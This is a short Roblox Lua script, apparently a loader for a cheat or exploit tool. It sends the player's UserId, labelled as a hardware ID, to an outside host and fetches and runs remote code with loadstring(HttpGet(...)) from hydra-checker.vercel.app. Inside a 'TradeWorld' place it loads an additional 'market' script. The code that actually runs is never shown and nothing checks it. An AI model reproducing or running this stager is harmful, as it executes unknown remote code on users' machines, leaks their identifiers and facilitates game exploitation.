local HWID = tostring(game:GetService("Players").LocalPlayer.UserId)

local isTradeWorld = false
pcall(function()
    local TW_Data = require(game:GetService("ReplicatedStorage"):WaitForChild("Data"):WaitForChild("TradeWorldData"))
    isTradeWorld = TW_Data and game.PlaceId == TW_Data.PlaceId
end)
if not isTradeWorld then
    pcall(function()
        isTradeWorld = workspace:FindFirstChild("TradeWorld") ~= nil
    end)
end

if isTradeWorld then
    -- Load market script
    task.spawn(function()
        loadstring(game:HttpGet("https://hydra-checker.vercel.app/api/load-market?hwid=" .. HWID))()
    end)
    -- Load main script juga
    task.spawn(function()
        loadstring(game:HttpGet("https://hydra-checker.vercel.app/api/load?hwid=" .. HWID))()
    end)
else
    loadstring(game:HttpGet("https://hydra-checker.vercel.app/api/load?hwid=" .. HWID))()
end
